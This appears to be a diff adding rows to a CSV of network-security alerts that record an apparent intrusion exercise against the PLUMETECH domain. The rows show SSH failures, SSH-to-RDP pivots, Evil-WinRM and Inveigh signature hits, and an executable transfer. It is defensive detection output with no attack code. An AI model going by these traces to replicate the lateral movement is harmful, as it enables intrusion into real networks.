+  not_after: , 2026-03-04T20:39:31Z, 2026-03-27T01:24:33Z, 2025-09-05T16:45:25Z, 2025-09-16T23:59:59Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.7.30, 10.0.5.29, 10.0.4.29, 10.0.2.11, 10.0.10.29, 10.0.3.30;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"48,1713,3846,3845,3860,3858,3865,3847,357,3853,3850,1896,1801,1763,1704,1914",,,"10.0.3.11,23.32.238.128,40.126.31.67,20.42.73.24,95.100.158.115,23.11.206.96,40.90.65.142,20.190.160.4,142.250.185.110,104.208.16.90","10.0.2.11,10.0.3.30,10.0.10.29,10.0.4.29,10.0.5.29,10.0.7.30",,"e4f0d828-4c5a-4ff7-9eab-b822087a0ca7, 8adbaee7-db9d-4288-a47c-75c64cb3ebe5, 7649c6e2-8485-4e0b-8b92-ba4e37df1fa3, ab9d1caf-ac5a-4ca2-9c89-a358173237d2, b46ddac8-f7f7-42e5-9a78-364f0b7db769, 6cfee7ff-8ac1-4371-8cb6-5405bc62bf45, 18a22f55-7840-4767-9b0a-f4a22a84be64, 1ae19404-7899-44fa-aab8-9f8d0d2795cf, 1d6adc8f-e1ea-421e-a8f6-0a9b171519c1, 33862a12-346a-4b6f-aef2-fc24441fd3c3",
+Low,33563,2025-03-28T10:56:55Z,Asset,Configuration,Detected 8 NewUserAgent between 2025-03-28T10:45:21.640Z and 2025-03-28T10:56:55.331Z,"Sample NewUserAgent values include:
+  dst__port: ('',);
+  uuid: 18522455-fe9b-470b-b4ff-0d8be15403a8, 1d86218a-d042-49d1-8f9b-bb5ad2b855f4, 00d1d61c-7408-40c8-a152-907e2c993151, dba9ad0b-ae26-4a4a-87f3-10caa440db9e, a6759d52-f587-49f4-8184-d1d09a43392e, 2f4b457c-b707-4b17-adc8-e9932db7aaf5, 187dbda4-b3b3-41f4-b92e-da69e197301a, 146fd20f-3117-4c0d-8aba-05158e416f82;
+  src__mac: ;
+  src_ip: 10.0.1.29, 10.0.7.30, 10.0.2.44, 10.0.4.29, 10.0.1.11, 10.0.5.30;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 45, 1936, 1763, 44, 1914, 143;
+  dst__ip: ;
+  src__port: ('',);
+  user_agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0, Ruby WinRM Client (2.8.3, ruby 3.3.7 (2025-01-15)), Microsoft BITS/7.8, Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.20348.2849, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0, Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36;
+  src__ip: ;",User Agent First Seen,"1936,1763,1914,45,143,44",,,,,"10.0.5.30,10.0.4.29,10.0.7.30,10.0.1.11,10.0.2.44,10.0.1.29","18522455-fe9b-470b-b4ff-0d8be15403a8, 1d86218a-d042-49d1-8f9b-bb5ad2b855f4, 00d1d61c-7408-40c8-a152-907e2c993151, dba9ad0b-ae26-4a4a-87f3-10caa440db9e, a6759d52-f587-49f4-8184-d1d09a43392e, 2f4b457c-b707-4b17-adc8-e9932db7aaf5, 187dbda4-b3b3-41f4-b92e-da69e197301a, 146fd20f-3117-4c0d-8aba-05158e416f82",
+Low,33564,2025-03-28T10:59:49Z,Indicator,Indicator,DNS Query to Suspicious TLD .download,DNS Query to Suspicious TLD .download,Suspicious TLD Signatures,"1905,69",,,10.0.4.30,8.8.8.8,,Network Traffic,
+Low,33565,2025-03-28T10:59:49Z,Indicator,Indicator,DNS Query to Suspicious TLD .download,DNS Query to Suspicious TLD .download,Suspicious TLD Signatures,"1905,69",,,10.0.4.30,8.8.8.8,,Network Traffic,
+Low,33566,2025-03-28T10:59:49Z,Indicator,Indicator,HTTP Request to Suspicious TLD .download,HTTP Request to Suspicious TLD .download,Suspicious TLD Signatures,"1905,2660",,,10.0.4.30,104.17.254.239,,Network Traffic,
+Low,33567,2025-03-28T10:59:49Z,Indicator,Indicator,HTTP Request to Suspicious TLD .download,HTTP Request to Suspicious TLD .download,Suspicious TLD Signatures,"1905,2660",,,10.0.4.30,104.17.254.239,,Network Traffic,
+Low,33601,2025-03-28T11:08:39Z,Communication,Configuration,Detected 30 NewX509Certificate between 2025-03-28T10:55:27.659Z and 2025-03-28T11:08:39.919Z,"Sample NewX509Certificate values include:
+  server: 2.19.198.58, 23.11.206.97, 23.11.206.105, 20.190.160.3, 20.190.160.20, 20.50.73.13, 50.116.1.184, 142.250.185.163, 13.69.109.131, 95.100.158.121;
+  subject: , CN=DC1.PLUMETECH.LOCAL, CN=insecure.com, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com;
+  not_before: , 2025-03-24T09:04:12Z, 2025-03-16T00:00:00Z, 2025-03-27T01:24:33Z, 2025-03-18T00:00:00Z;
+  server_asset_id: 3893, 3896, 3872, 1832, 220, 3876, 3889, 3881, 2738, 3882;
+  dst__port: ('',);
+  dns: ;
+  uuid: 412640da-7d6c-47f5-9f11-f20ecb1f8713, 3ab11504-8eb0-466e-8da8-3eadd87fa528, 3fb663b5-74dd-40e2-8896-ff313ab70421, 854740d7-b4a5-42b0-b1a4-5671c9f971d5, b5e9735b-af93-483d-98e7-e0fb420f513a, d16a1d2c-7831-45ad-ad75-d667d1a4b780, 87b0d1b5-e0c4-4511-8bd7-2f38e7b2528e, ddca6441-6417-4d61-9aeb-a68ea9b917a5, 8373ee8f-fa0f-4776-af5f-997d895413aa, 22022ffd-7693-45d9-8e6f-b2efd2e8527c;
+  issuer: , DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA, C=US, O=Let's Encrypt, CN=R11, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA;
+  client_asset_id: 1905, 45, 48, 1746, 1801, 1919, 1933, 1914;
+  src__mac: ;
+  not_after: , 2025-06-22T09:04:11Z, 2026-03-27T01:24:33Z, 2025-09-16T23:59:59Z, 2025-09-18T23:59:59Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.7.30, 10.0.6.29, 10.0.10.30, 10.0.4.30, 10.0.2.11, 10.0.10.29, 10.0.1.11, 10.0.11.30;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"3893,3896,3872,3876,3881,3889,3882,45,1832,220,2738,1905,48,1746,1801,1919,1933,1914",,,"20.189.173.17,216.58.206.40,23.3.89.122,23.11.206.99,142.250.185.163,184.25.50.201,20.42.65.89,10.0.4.11,20.190.159.131,20.190.160.66","10.0.1.11,10.0.4.30,10.0.2.11,10.0.6.29,10.0.10.29,10.0.10.30,10.0.11.30,10.0.7.30",,"412640da-7d6c-47f5-9f11-f20ecb1f8713, 3ab11504-8eb0-466e-8da8-3eadd87fa528, 3fb663b5-74dd-40e2-8896-ff313ab70421, 854740d7-b4a5-42b0-b1a4-5671c9f971d5, b5e9735b-af93-483d-98e7-e0fb420f513a, d16a1d2c-7831-45ad-ad75-d667d1a4b780, 87b0d1b5-e0c4-4511-8bd7-2f38e7b2528e, ddca6441-6417-4d61-9aeb-a68ea9b917a5, 8373ee8f-fa0f-4776-af5f-997d895413aa, 22022ffd-7693-45d9-8e6f-b2efd2e8527c",
+Low,33623,2025-03-28T11:04:04Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,96d32f54-d3e4-4106-9bdf-6fe985b22a68,
+Low,33626,2025-03-28T11:03:18Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,b631cbc6-9652-4f3f-8854-35f0fc12708a,
+Low,33661,2025-03-28T10:47:57Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1905 (10.0.4.30) to then pivot to asset 1763 (10.0.4.29) via RDP.,Interactive Session Pivots,"2896,1763",,,10.0.242.127,10.0.4.29,,,
+Low,33718,2025-03-28T11:22:42Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1905 (10.0.4.30) to then pivot to asset 1763 (10.0.4.29) via RDP.,Interactive Session Pivots,"2896,1763",,,10.0.242.127,10.0.4.29,,,
+Low,33731,2025-03-28T11:27:14Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,7bf63250-c279-4311-836c-5325c2965eb0,
+Low,33746,2025-03-28T11:17:29Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,9cbf33ad-4cdb-47fb-8c19-c032395b80c4,
+Low,33749,2025-03-28T11:14:11Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,870d81a6-b997-4b50-b9fb-4ee7cdcb286e,
+Low,33801,2025-03-28T11:38:39Z,Communication,Configuration,RDP New Cookie,New RDP cookie PLUMETECHplumber from host 10.0.4.11 (asset 1832) to host 10.0.4.30 (asset 1905).,RDP New Cookie,"1832,1905",,,10.0.4.11,10.0.4.30,,,
+Low,33806,2025-03-28T11:38:39Z,Communication,Configuration,Detected 18 RDP New Comms between 2025-03-28T11:27:36.019Z and 2025-03-28T11:38:39.589Z,"Sample RDP New Comms values include:
+  rdp_client_name: ;
+  dst__port: ('',);
+  ip_src: 10.0.1.12, 10.0.7.30, 10.0.4.11, 10.0.4.30, 10.0.9.29, 10.0.7.11, 10.0.11.11, 10.0.10.29, 10.0.11.12, 10.0.10.44;
+  dst_asset_id: 1905, 1721, 1725, 45, 1772, 1807, 1832, 1801, 1723, 1933;
+  rdp_keyboard_layout: ;
+  ip_dst: 10.0.7.30, 10.0.9.30, 10.0.4.11, 10.0.11.29, 10.0.4.30, 10.0.7.11, 10.0.11.11, 10.0.10.29, 10.0.11.12, 10.0.10.44;
+  rdp_selected_protocol: , hybrid, hybrid_ex;
+  src__mac: ;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1721, 1905, 46, 1772, 1723, 1807, 1801, 1832, 1729, 1933;
+  dst__ip: ;
+  src__port: ('',);
+  rdp_rt_cookie: , bin, plumber, PLUMETECHplumber, root, nmap, domain admins, User1, alice;
+  src__ip: ;",RDP New Comms Pattern,"1721,1725,1723,1772,1801,1933,1832,1905,45,46,1807,1729",,,"10.0.11.12,10.0.11.11,10.0.7.11,10.0.10.29,10.0.11.30,10.0.4.11,10.0.4.30,10.0.1.12,10.0.10.44,10.0.9.29","10.0.11.12,10.0.11.29,10.0.11.11,10.0.7.11,10.0.10.29,10.0.11.30,10.0.4.11,10.0.4.30,10.0.1.11,10.0.10.44",,,
+Low,33823,2025-03-28T11:37:09Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"1905,2896",,,10.0.242.127,10.0.4.30,,e0d3b5d0-f1d3-440a-9fb9-6062cbb1aa6d,
+Low,33855,2025-03-28T11:38:33Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1905 (10.0.4.30) to then pivot to asset 1832 (10.0.4.11) via RDP.,Interactive Session Pivots,"1832,2896",,,10.0.242.127,10.0.4.11,,,
+Low,34820,2025-03-28T11:38:39Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.4.11 (1832) to host 10.0.4.30 (1905). If unencrypted, may also include the RDP cookie (PLUMETECHplumber), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1905,1832",,,10.0.4.11,10.0.4.30,,,
+Low,34821,2025-03-28T11:37:38Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.4.30 (1905) to host 10.0.4.11 (1832). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1905,1832",,,10.0.4.30,10.0.4.11,,,
+Low,34822,2025-03-28T11:37:38Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.4.11 (1832) to host 10.0.4.30 (1905). If unencrypted, may also include the RDP cookie (plumber), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1905,1832",,,10.0.4.11,10.0.4.30,,,
+Low,35017,2025-03-28T11:51:43Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1905 (10.0.4.30) to then pivot to asset 1763 (10.0.4.29) via RDP.,Interactive Session Pivots,"2896,1763",,,10.0.242.127,10.0.4.29,,,
+Low,35032,2025-03-28T11:56:58Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.4.30.,SSH Authentication Failure,"2896,1905",,,10.0.242.127,10.0.4.30,,59bce3b7-bfbe-44b0-98a1-dda8969c8e4a,
+Medium,35089,2025-03-28T12:09:54Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35090,2025-03-28T12:09:43Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35093,2025-03-28T12:10:44Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35094,2025-03-28T12:10:46Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35096,2025-03-28T12:12:13Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35099,2025-03-28T12:13:09Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35100,2025-03-28T12:12:47Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35101,2025-03-28T12:12:10Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35102,2025-03-28T12:13:36Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35103,2025-03-28T12:13:32Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Low,35116,2025-03-28T12:09:54Z,Asset,Configuration,User-Agent First Seen from Host,"Asset 1905 made an HTTP request with User-Agent Ruby WinRM Client (2.8.3, ruby 3.3.7 (2025-01-15)) for the first time.",User Agent First Seen,1905,,,,,10.0.4.30,015d90c4-9745-4d7f-a021-0bca3155b09d,
+Low,35127,2025-03-28T12:10:44Z,Communication,Indicator,Failed HTTP Logon,"Asset 1832 (10.0.4.11) returned an HTTP response code of 401 'Unauthorized' to asset 1905 (10.0.4.30), which represents a failed logon attempt via HTTP by asset 1905. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1832,1905",,,10.0.4.11,10.0.4.30,,8dd54a2c-dc68-4571-9cda-63381b38b17d,
+Low,35147,2025-03-28T12:00:23Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1905 (10.0.4.30) to then pivot to asset 1763 (10.0.4.29) via RDP.,Interactive Session Pivots,"2896,1763",,,10.0.242.127,10.0.4.29,,,
+Medium,35152,2025-03-28T12:15:06Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35153,2025-03-28T12:16:20Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35154,2025-03-28T12:15:08Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35162,2025-03-28T12:16:37Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35163,2025-03-28T12:17:56Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35164,2025-03-28T12:18:16Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35165,2025-03-28T12:17:19Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35167,2025-03-28T12:18:30Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35180,2025-03-28T12:20:43Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35181,2025-03-28T12:20:43Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35193,2025-03-28T12:23:33Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35195,2025-03-28T12:23:19Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35198,2025-03-28T12:24:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35199,2025-03-28T12:24:55Z,Indicator,Threat Behavior,HTTP Download Executable Smaller than 1 MB,HTTP Download Executable Smaller than 1 MB,HTTP Executable Download Signatures,"115,1832",,,199.232.214.172,10.0.4.11,,Network Traffic,
+Medium,35205,2025-03-28T12:25:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35210,2025-03-28T12:27:23Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35223,2025-03-28T12:28:50Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35224,2025-03-28T12:28:49Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Low,35225,2025-03-28T12:14:03Z,Asset,Configuration,User-Agent First Seen from Host,Asset 1832 made an HTTP request with User-Agent Microsoft NCSI for the first time.,User Agent First Seen,1832,,,,,10.0.4.11,d1c07ae0-95d1-4e93-b35d-ea4ddf10bd92,
+Low,35227,2025-03-28T12:23:54Z,Asset,Configuration,User-Agent First Seen from Host,Asset 1832 made an HTTP request with User-Agent curl/8.9.1 for the first time.,User Agent First Seen,1832,,,,,10.0.4.11,de6f965f-e3e4-4db4-abd8-cf0addbbd56f,
+Low,35233,2025-03-28T12:24:30Z,Communication,Configuration,Detected 10 NewX509Certificate between 2025-03-28T12:20:53.658Z and 2025-03-28T12:24:30.386Z,"Sample NewX509Certificate values include:
+  server: 18.244.18.38, 2.19.198.72, 10.0.4.30, 172.217.16.129, 20.190.160.5, 20.42.73.25, 2.16.110.203, 2.19.198.74, 142.250.185.67, 2.16.110.195;
+  subject: ;
+  not_before: ;
+  server_asset_id: 3940, 3939, 3941, 3938, 1905, 430, 3595, 373, 3834, 3942;
+  dst__port: ('',);
+  dns: ;
+  uuid: 3410db2b-bd43-4495-b3f4-434e1269af73, 1c248a59-7c5d-48a8-bc44-2f4436c9cc76, 576427bd-0c35-4547-9050-17b7e0f1970e, ab46fd0c-9421-493d-93f6-3bf8fd444aaa, 2c6d80c1-f849-445d-a67e-fe06ccb0c0fd, 4aea590f-7b82-4965-b384-f4d3b894ef8d, 92d82671-6d2b-417f-b2ae-37ea5fd215f1, 2e4a49f3-62d3-4a6c-9c0f-6e33be66267e, 946dde9e-c42c-4abe-9492-6a4d23ca0ec6, 23895640-9505-4076-b5ad-dd5ae870be43;
+  issuer: ;
+  client_asset_id: 1832, 1779;
+  src__mac: ;
+  not_after: ;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.8.11, 10.0.4.11;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"1905,1832,1779,3940,3939,3941,3938,430,3595,373,3834,3942",,,"10.0.4.30,2.19.198.72,172.217.16.129,20.42.73.25,18.244.18.38,20.190.160.5,142.250.185.67,2.16.110.203,2.16.110.195,2.19.198.74","10.0.4.11,10.0.8.11",,"3410db2b-bd43-4495-b3f4-434e1269af73, 1c248a59-7c5d-48a8-bc44-2f4436c9cc76, 576427bd-0c35-4547-9050-17b7e0f1970e, ab46fd0c-9421-493d-93f6-3bf8fd444aaa, 2c6d80c1-f849-445d-a67e-fe06ccb0c0fd, 4aea590f-7b82-4965-b384-f4d3b894ef8d, 92d82671-6d2b-417f-b2ae-37ea5fd215f1, 2e4a49f3-62d3-4a6c-9c0f-6e33be66267e, 946dde9e-c42c-4abe-9492-6a4d23ca0ec6, 23895640-9505-4076-b5ad-dd5ae870be43",
+Medium,35234,2025-03-28T12:23:54Z,Communication,Threat Behavior,File Transfer of Executable,Host 10.0.4.11 (asset 1905) transferred file /win.exe (application/x-msdos-program) (sha256 f929d1eba1dc87bf4161b82fa7891d759aba35bed58f865770c8dee9a4e7d176) to 10.0.4.30 (asset 1832).,File Transfer of Executable,"1905,1832",,,10.0.4.30,10.0.4.11,,1f85eab6-c6aa-4491-a83a-c5f1e8ce7e2c,
+Low,35238,2025-03-28T12:27:11Z,Communication,Configuration,Detected 6 RDP New Comms between 2025-03-28T12:14:13.118Z and 2025-03-28T12:27:11.640Z,"Sample RDP New Comms values include:
+  rdp_client_name: ;
+  dst__port: ('',);
+  ip_src: 10.0.4.11, 10.0.9.44, 10.0.8.30, 10.0.9.11, 10.0.6.11, 10.0.8.11;
+  dst_asset_id: 1829, 1916, 1746, 1921, 1779;
+  rdp_keyboard_layout: ;
+  ip_dst: 10.0.6.29, 10.0.9.30, 10.0.8.30, 10.0.4.12, 10.0.8.11;
+  rdp_selected_protocol: , hybrid_ex;
+  src__mac: ;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1732, 1727, 1916, 1832, 1754, 1779;
+  dst__ip: ;
+  src__port: ('',);
+  rdp_rt_cookie: , administrator, plumber;
+  src__ip: ;",RDP New Comms Pattern,"1832,1779,1754,1732,1727,1916,1829,1746,1921",,,"10.0.4.11,10.0.8.11,10.0.6.11,10.0.9.11,10.0.9.44,10.0.8.30","10.0.8.11,10.0.8.30,10.0.4.12,10.0.6.29,10.0.9.30",,,
+Low,35241,2025-03-28T12:18:38Z,Communication,Configuration,New SMB Communication detected,"New SMB_FileInfo (version: ['SMB1', 'SMB2']) traffic between Asset:1832 and Asset:1905",New SMB Communication Detection,"1905,1832",,,10.0.4.11,10.0.4.30,,61a30aa9-ef94-4ddb-9138-16287874f450,
+Low,35247,2025-03-28T12:23:54Z,Communication,Configuration,New Global User Agent,User Agent 'curl/8.9.1' was seen in the environment for the first time. Originating from asset 1832 (10.0.4.11) to 10.0.4.30 (10.0.4.30).,User Agent First Seen Globally,"1905,1832",,,10.0.4.11,10.0.4.30,,de6f965f-e3e4-4db4-abd8-cf0addbbd56f,
+Medium,35250,2025-03-28T12:29:31Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35251,2025-03-28T12:29:32Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35254,2025-03-28T12:30:59Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35255,2025-03-28T12:30:40Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35256,2025-03-28T12:31:54Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35258,2025-03-28T12:32:40Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35259,2025-03-28T12:32:42Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35263,2025-03-28T12:33:35Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35264,2025-03-28T12:33:34Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35280,2025-03-28T12:35:07Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35281,2025-03-28T12:35:08Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Low,35283,2025-03-28T12:35:30Z,Indicator,Threat Behavior,NTLMSSP after STATUS_BAD_NETWORK_NAME,NTLMSSP after STATUS_BAD_NETWORK_NAME,Inveigh Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,35285,2025-03-28T12:36:34Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35286,2025-03-28T12:35:22Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35287,2025-03-28T12:36:34Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35291,2025-03-28T12:37:34Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35295,2025-03-28T12:39:28Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35296,2025-03-28T12:39:26Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
